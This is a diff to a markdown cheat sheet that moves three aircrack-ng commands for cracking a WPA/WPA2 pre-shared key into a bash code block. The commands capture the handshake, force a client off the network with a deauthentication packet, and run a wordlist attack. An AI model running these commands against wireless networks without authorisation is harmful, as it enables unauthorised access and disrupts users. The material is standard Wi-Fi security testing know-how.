@@ -31,15 +31,16 @@
    * [Crack WEP (without client)](https://www.aircrack-ng.org/doku.php?id=how_to_crack_wep_with_no_clients)
 
   # WAP crack
-  
-   * Crack WPA/WPA2 pre-shared key
-     * Start airodump-ng to collect authentication handshake
-       * **airodump-ng -c 9 --bssid 00:14:6C:7E:40:80 -w psk wlan0mon**
-     * Use aireplay-ng to deauthenticate the wireless client
-       * **aireplay-ng -0 1 -a 00:14:6C:7E:40:80 -c 00:0F:B5:FD:FB:C2 wlan0mon**
-     * Run aircrack-ng to crack the pre-shared key
-       * **aircrack-ng -w password.lst -b 00:14:6C:7E:40:80 psk*.cap**
-
+  * Crack WPA/WPA2 pre-shared key
+      
+      ```bash
+         # Start airodump-ng to collect authentication handshake
+         airodump-ng -c 9 --bssid 00:14:6C:7E:40:80 -w psk wlan0mon
+         # Use aireplay-ng to deauthenticate the wireless client
+         aireplay-ng -0 1 -a 00:14:6C:7E:40:80 -c 00:0F:B5:FD:FB:C2 wlan0mon
+         # Run aircrack-ng to crack the pre-shared key
+         aircrack-ng -w password.lst -b 00:14:6C:7E:40:80 psk*.cap
+      ```
 
    * [The upper data block shows the access points found](https://www.aircrack-ng.org/doku.php?id=newbie_guide)
 
